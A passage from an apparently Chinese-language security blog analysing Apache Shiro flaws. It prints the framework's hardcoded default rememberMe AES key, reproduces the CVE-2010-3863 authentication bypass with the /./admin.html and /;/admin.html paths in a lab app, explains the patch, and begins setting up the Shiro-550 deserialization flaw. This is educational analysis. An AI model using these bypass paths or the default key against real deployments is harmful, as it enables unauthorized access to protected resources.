<p>加密的过程中，可以看到我们会用getEncryptionCipherKey()方法获得秘钥，也就是当前类的encryptionCipherKey属性。它是怎么来的呢？</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] encrypt(<span class="type">byte</span>[] serialized) &#123;</span><br><span class="line">    <span class="type">byte</span>[] value = serialized;</span><br><span class="line">    <span class="type">CipherService</span> <span class="variable">cipherService</span> <span class="operator">=</span> getCipherService();</span><br><span class="line">    <span class="keyword">if</span> (cipherService != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">byteSource</span> <span class="operator">=</span> cipherService.encrypt(serialized, getEncryptionCipherKey());</span><br><span class="line">        value = byteSource.getBytes();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] getEncryptionCipherKey() &#123;</span><br><span class="line">    <span class="keyword">return</span> encryptionCipherKey;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我从当前类截取了下面部分代码，那么其实就很清楚了。代码会有一个默认的Shiro秘钥，当前类初始化的时候就会通过setCipherKey方法吧加解密秘钥都设置为默认秘钥。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[] encryptionCipherKey;</span><br><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[] decryptionCipherKey;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">AbstractRememberMeManager</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.serializer = <span class="keyword">new</span> <span class="title class_">DefaultSerializer</span>&lt;PrincipalCollection&gt;();</span><br><span class="line">    <span class="built_in">this</span>.cipherService = <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">    setCipherKey(DEFAULT_CIPHER_KEY_BYTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCipherKey</span><span class="params">(<span class="type">byte</span>[] cipherKey)</span> &#123;</span><br><span class="line">    setEncryptionCipherKey(cipherKey);</span><br><span class="line">    setDecryptionCipherKey(cipherKey);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setEncryptionCipherKey</span><span class="params">(<span class="type">byte</span>[] encryptionCipherKey)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.encryptionCipherKey = encryptionCipherKey;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Shiro历史漏洞"><a href="#Shiro历史漏洞" class="headerlink" title="Shiro历史漏洞"></a>Shiro历史漏洞</h2><p>官网漏洞报告：<a target="_blank" rel="noopener" href="https://shiro.apache.org/security-reports.html">Security Reports | Apache Shiro</a></p>
<h3 id="CVE-2010-3863"><a href="#CVE-2010-3863" class="headerlink" title="CVE-2010-3863"></a>CVE-2010-3863</h3><blockquote>
<p>Apache Shiro before 1.1.0, and JSecurity 0.9.x, does not canonicalize URI paths before comparing them to entries in the shiro.ini file, which allows remote attackers to bypass intended access restrictions via a crafted request, as demonstrated by the &#x2F;.&#x2F;account&#x2F;index.jsp URI.</p>
</blockquote>
<h4 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h4><p>影响版本：<code>shiro &lt; 1.1.0</code> 和<code>JSecurity 0.9.x</code></p>
<p>漏洞成因：没有对URI路径进行标准化处理（即未进行规范化），这使得远程攻击者可以通过构造特定的请求来绕过预期的访问限制。</p>
<p>漏洞补丁：<a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/ab8294940a19743583d91f0c7e29b405d197cc34">https://github.com/apache/shiro/commit/ab8294940a19743583d91f0c7e29b405d197cc34</a></p>
<h4 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h4><p>先新建一个Springboot模块，导入依赖</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.0-incubating<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>部分代码参考：<a target="_blank" rel="noopener" href="https://github.com/dota-st/vulnEnv/tree/main/CVE-2010-3863(shiro)/ShiroDemo">vulnEnv&#x2F;CVE-2010-3863(shiro)&#x2F;ShiroDemo at main · dota-st&#x2F;vulnEnv</a></p>
<p>shiro.ini</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[users]</span></span><br><span class="line"><span class="comment"># 用户名=密码,角色</span></span><br><span class="line"><span class="attr">admin</span>=admin123,admin</span><br><span class="line"><span class="attr">user</span>=user123,user</span><br><span class="line"></span><br><span class="line"><span class="section">[roles]</span></span><br><span class="line"><span class="comment"># 角色=权限</span></span><br><span class="line"><span class="attr">admin</span>=*</span><br><span class="line"><span class="attr">user</span>=read,write</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ShiroConfig.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShiroConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> SecurityManager <span class="title function_">securityManager</span><span class="params">(Realm realm)</span> &#123;</span><br><span class="line">        <span class="type">DefaultWebSecurityManager</span> <span class="variable">securityManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultWebSecurityManager</span>();</span><br><span class="line">        securityManager.setRealm(realm);</span><br><span class="line">        <span class="keyword">return</span> securityManager;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> ShiroFilterFactoryBean <span class="title function_">shiroFilter</span><span class="params">(SecurityManager securityManager)</span> &#123;</span><br><span class="line">        <span class="type">ShiroFilterFactoryBean</span> <span class="variable">shiroFilterFactoryBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ShiroFilterFactoryBean</span>();</span><br><span class="line">        shiroFilterFactoryBean.setSecurityManager(securityManager);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 配置登录和未授权的页面</span></span><br><span class="line">        shiroFilterFactoryBean.setLoginUrl(<span class="string">&quot;/login&quot;</span>);</span><br><span class="line">        shiroFilterFactoryBean.setUnauthorizedUrl(<span class="string">&quot;/unauthorized&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 配置路径权限</span></span><br><span class="line">        Map&lt;String, String&gt; filterChainDefinitionMap = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;();</span><br><span class="line">        filterChainDefinitionMap.put(<span class="string">&quot;/admin.html&quot;</span>, <span class="string">&quot;authc, roles[admin]&quot;</span>);</span><br><span class="line">        filterChainDefinitionMap.put(<span class="string">&quot;/admin/**&quot;</span>, <span class="string">&quot;authc, roles[admin]&quot;</span>);</span><br><span class="line">        filterChainDefinitionMap.put(<span class="string">&quot;/user.html&quot;</span>, <span class="string">&quot;authc, roles[user]&quot;</span>);</span><br><span class="line">        filterChainDefinitionMap.put(<span class="string">&quot;/user/**&quot;</span>, <span class="string">&quot;authc, roles[user]&quot;</span>);</span><br><span class="line">        filterChainDefinitionMap.put(<span class="string">&quot;/**&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line"></span><br><span class="line">        shiroFilterFactoryBean.setFilterChainDefinitionMap(filterChainDefinitionMap);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> shiroFilterFactoryBean;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 配置 IniRealm</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> IniRealm <span class="title function_">getIniRealm</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">IniRealm</span>(<span class="string">&quot;classpath:shiro.ini&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>文件结构</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">main</span><br><span class="line"> ├─java</span><br><span class="line"> │  └─cmisl</span><br><span class="line"> │      │  Cve20103863Application.java</span><br><span class="line"> │      │  </span><br><span class="line"> │      └─Shiro</span><br><span class="line"> │              ShiroConfig.java</span><br><span class="line"> │              ShiroUtil.java</span><br><span class="line"> │              UserController.java</span><br><span class="line"> │              </span><br><span class="line"> └─resources</span><br><span class="line">     │  application.properties</span><br><span class="line">     │  shiro.ini</span><br><span class="line">     │  </span><br><span class="line">     └─static</span><br><span class="line">             admin.html</span><br><span class="line">             home.html</span><br><span class="line">             index.html</span><br><span class="line">             login.html</span><br><span class="line">             unauthorized.html</span><br><span class="line">             user.html</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>所有的具体代码随后放在github上</p>
<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>根据我们的配置，我们访问<code>/admin/**</code>和<code>/admin.html</code>都是需要认证<code>admin</code>权限的。当我们访问的时候就会重定向到登录页面，需要我们完成认证，之后再去访问<code>/admin.html</code>才会显示内容。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241111023900750.png" alt="image-20241111023900750"></p>
<p>如果没有认证，我们去访问需要认证的资源&#x2F;页面，就会出现302跳转让我们去登录。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241111024023954.png" alt="image-20241111024023954"></p>
<p>而根据该漏洞POC，我们将<code>/admin.html</code>改为<code>/./admin.html</code>即可访问到资源。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241111024156922.png" alt="image-20241111024156922"></p>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>从上面的分析可以知道，通过匹配url确定过滤器，上面的poc很显然试试通过url绕过匹配，从而跳过过滤器的过滤。url的匹配开始于<code>org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain</code>方法。可以直接打上断点。</p>
<p>首先把请求作为参数调用<code>PathMatchingFilterChainResolver#getPathWithinApplication</code>方法获取请求url。其中涉及的调用堆栈如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">decode:<span class="number">168</span>, URLDecoder (java.net)</span><br><span class="line">decodeRequestString:<span class="number">194</span>, WebUtils (org.apache.shiro.web.util)</span><br><span class="line">decodeAndCleanUriString:<span class="number">151</span>, WebUtils (org.apache.shiro.web.util)</span><br><span class="line">getRequestUri:<span class="number">140</span>, WebUtils (org.apache.shiro.web.util)</span><br><span class="line">getPathWithinApplication:<span class="number">112</span>, WebUtils (org.apache.shiro.web.util)</span><br><span class="line">getPathWithinApplication:<span class="number">147</span>, PathMatchingFilterChainResolver (org.apache.shiro.web.filter.mgt)</span><br></pre></td></tr></table></figure>

<p>其中我比较关注的方法如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> String <span class="title function_">getPathWithinApplication</span><span class="params">(ServletRequest request)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> WebUtils.getPathWithinApplication(WebUtils.toHttp(request));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getPathWithinApplication</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">contextPath</span> <span class="operator">=</span> getContextPath(request);</span><br><span class="line">    <span class="type">String</span> <span class="variable">requestUri</span> <span class="operator">=</span> getRequestUri(request);</span><br><span class="line">    <span class="keyword">if</span> (StringUtils.startsWithIgnoreCase(requestUri, contextPath)) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> requestUri.substring(contextPath.length());</span><br><span class="line">        <span class="keyword">return</span> StringUtils.hasText(path) ? path : <span class="string">&quot;/&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> requestUri;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">decodeAndCleanUriString</span><span class="params">(HttpServletRequest request, String uri)</span> &#123;</span><br><span class="line">    uri = decodeRequestString(request, uri);</span><br><span class="line">    <span class="type">int</span> <span class="variable">semicolonIndex</span> <span class="operator">=</span> uri.indexOf(<span class="number">59</span>);</span><br><span class="line">    <span class="keyword">return</span> semicolonIndex != -<span class="number">1</span> ? uri.substring(<span class="number">0</span>, semicolonIndex) : uri;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">decode</span><span class="params">(String s, String enc)</span></span><br><span class="line">	......</span><br><span class="line">    <span class="keyword">while</span> (i &lt; numChars) &#123;</span><br><span class="line">        c = s.charAt(i);</span><br><span class="line">        <span class="keyword">switch</span> (c) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">            sb.append(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">            i++;</span><br><span class="line">            needToChange = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;%&#x27;</span>:</span><br><span class="line">            ......</span><br><span class="line">            <span class="comment">//处理 URL 编码（即将某些字符转换为 %xy 形式，其中 xy 是字符的十六进制 ASCII 值）</span></span><br><span class="line">            ......</span><br><span class="line">            needToChange = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            sb.append(c);</span><br><span class="line">            i++;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (needToChange? sb.toString() : s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我省略了一些代码，详细代码可以自己跟进对应的方法。上面的一系列方法中，可以看到，我们会先用<code>URLDecoder#decode</code>解码。比如如果遇到了<code>+</code>号，就会替换为空格，还有百分号<code>%</code>，会进行URL解码。然后到<code>decodeAndCleanUriString</code>方法，<code>uri.indexOf(59)</code>代码会去获取该url中ascii码为59对应符号的索引，然后只返回分号<code>;</code>前面的url。</p>
<p>所以其实分析到这里，我们似乎可以用另一个方式绕过，比如访问<code>/;/admin.html</code>，只要分号在tomcat服务器的代码中不被影响，就会获取到&#x2F;路径，从而匹配到的是anon对应的过滤器，即匿名访问过滤器<code>AnonymousFilter</code>，可以直接访问需要Shiro鉴权认证的资源和路径了。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241111132030159.png" alt="image-20241111132030159"></p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241111132102144.png" alt="image-20241111132102144"></p>
<p>我们再来继续关注<code>/./admin.html</code>。这个url会被完整提取，主要在<code>AntPathMatcher#doMatch</code>进行详细匹配，具体调用堆栈如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">doMatch:<span class="number">112</span>, AntPathMatcher (org.apache.shiro.util)</span><br><span class="line">match:<span class="number">93</span>, AntPathMatcher (org.apache.shiro.util)</span><br><span class="line">matches:<span class="number">89</span>, AntPathMatcher (org.apache.shiro.util)</span><br><span class="line">pathMatches:<span class="number">135</span>, PathMatchingFilterChainResolver (org.apache.shiro.web.filter.mgt)</span><br><span class="line">getChain:<span class="number">106</span>, PathMatchingFilterChainResolver (org.apache.shiro.web.filter.mgt)</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">doMatch</span><span class="params">(String pattern, String path, <span class="type">boolean</span> fullMatch)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (path.startsWith(<span class="built_in">this</span>.pathSeparator) != pattern.startsWith(<span class="built_in">this</span>.pathSeparator)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String[] pattDirs = StringUtils.tokenizeToStringArray(pattern, <span class="built_in">this</span>.pathSeparator);</span><br><span class="line">    String[] pathDirs = StringUtils.tokenizeToStringArray(path, <span class="built_in">this</span>.pathSeparator);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="variable">pattIdxStart</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">pattIdxEnd</span> <span class="operator">=</span> pattDirs.length - <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">pathIdxStart</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">pathIdxEnd</span> <span class="operator">=</span> pathDirs.length - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Match all elements up to the first **</span></span><br><span class="line">    <span class="keyword">while</span> (pattIdxStart &lt;= pattIdxEnd &amp;&amp; pathIdxStart &lt;= pathIdxEnd) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">patDir</span> <span class="operator">=</span> pattDirs[pattIdxStart];</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;**&quot;</span>.equals(patDir)) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!matchStrings(patDir, pathDirs[pathIdxStart])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先会根据<code>/</code>符号分解URL为数组，<code>/admin.html</code>分解为<code>[admin.html]</code>，<code>/./admin.html</code>分解为<code>[&quot;.&quot;, &quot;admin.html&quot;]</code>。然后会去比较分解出来的数组，匹配所有元素直到第一个 <code>**</code>，然后这两个数组，第一个元素就不相等，因此直接返回false。代表匹配失败，所以，不会匹配上<code>/admin.html</code>对应的Shiro过滤器。从而使得Shiro设置的权限检查失效。</p>
<h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p><a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/ab8294940a19743583d91f0c7e29b405d197cc34#diff-075715c04b416420c86d577dcfa7292792e4a500c9adbf0e744d7cf227666629R136">Normalize requestURI in getRequestURI using normalize() operations or… · apache&#x2F;shiro@ab82949</a></p>
<p>删除了<code>decodeAndCleanUriString</code>方法替换为<code>normalize</code>方法，根据注释很容易理解该方法用于规范化可能包含相对值（如 “&#x2F;.&#x2F;”“&#x2F;..&#x2F;” 等）的相对 URI 路径。同时因为没有了<code>decodeAndCleanUriString</code>方法，所有<code>/;/admin.html</code>也不行了，因为取分号前面路径的处理操作在<code>decodeAndCleanUriString</code>方法中。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241114102939433.png" alt="image-20241114102939433"></p>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11633?u_atoken=9ec0ef86b202f90a1bd6126f2ee5fac1&u_asig=1a0c399b17317886230205532e004a">Shiro 历史漏洞分析 - 先知社区</a></p>
<h3 id="CVE-2016-4437-Shiro-550反序列化漏洞"><a href="#CVE-2016-4437-Shiro-550反序列化漏洞" class="headerlink" title="CVE-2016-4437(Shiro-550反序列化漏洞)"></a>CVE-2016-4437(Shiro-550反序列化漏洞)</h3><blockquote>
<p>Apache Shiro before 1.2.5, when a cipher key has not been configured for the “remember me” feature, allows remote attackers to execute arbitrary code or bypass intended access restrictions via an unspecified request parameter.</p>
</blockquote>
<h4 id="漏洞信息-1"><a href="#漏洞信息-1" class="headerlink" title="漏洞信息"></a>漏洞信息</h4><p>影响版本：<code>shiro 1.x &lt; 1.2.5</code></p>
<p>漏洞成因：密钥被硬编码在shiro组件中，如果秘钥泄露或者被爆破出来，将会导致<code>rememberMe</code>参数反序列化漏洞。</p>
<p>漏洞补丁：<a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/4d5bb000a7f3c02d8960b32e694a565c95976848">Force RememberMe cipher to be set to survive JVM restart. · apache&#x2F;shiro@4d5bb00</a></p>
<h4 id="漏洞环境-1"><a href="#漏洞环境-1" class="headerlink" title="漏洞环境"></a>漏洞环境</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><p>漏洞描述提到该漏洞与RememberMe配置有关，那么我们这里补充一些该部分的知识。</p>
<p><code>RememberMe</code> 允许用户在下次访问时无需再次登录。它通过在用户的设备上存储一个持久化的标识符（通常是一个 cookie）来实现。这个标识符可以在再次访问时用于自动登录。</p>
<p>我们全局搜索RememberMe，找到与其相关的类如下：</p>
<h5 id="RememberMeManager"><a href="#RememberMeManager" class="headerlink" title="RememberMeManager"></a>RememberMeManager</h5><p>这个类(<code>org.apache.shiro.mgt.RememberMeManager</code>)是一个用于管理用户身份记住（Remember Me）功能的接口。下面是该接口提供的方法：</p>
<ol>
<li><strong>获取记住的身份</strong>：<ul>
<li><code>getRememberedPrincipals(SubjectContext subjectContext)</code>：根据提供的主题上下文，返回先前记住的用户身份。如果没有记住的身份，则返回 <code>null</code>。</li>
</ul>
</li>
<li><strong>遗忘身份</strong>：<ul>
<li><code>forgetIdentity(SubjectContext subjectContext)</code>：根据提供的主题上下文，遗忘与该上下文对应的用户身份信息。</li>
</ul>
</li>
<li><strong>处理成功的身份验证</strong>：<ul>
<li><code>onSuccessfulLogin(Subject subject, AuthenticationToken token, AuthenticationInfo info)</code>：在用户成功登录后，调用该方法以保存用户的身份信息。</li>
</ul>
</li>
<li><strong>处理失败的身份验证</strong>：<ul>
<li><code>onFailedLogin(Subject subject, AuthenticationToken token, AuthenticationException ae)</code>：在用户登录失败时，调用该方法以忘记先前记住的身份信息。</li>
</ul>
</li>
<li><strong>处理登出</strong>：<ul>
<li><code>onLogout(Subject subject)</code>：在用户登出时调用该方法，忘记与用户相关的身份信息。</li>
</ul>
</li>
</ol>
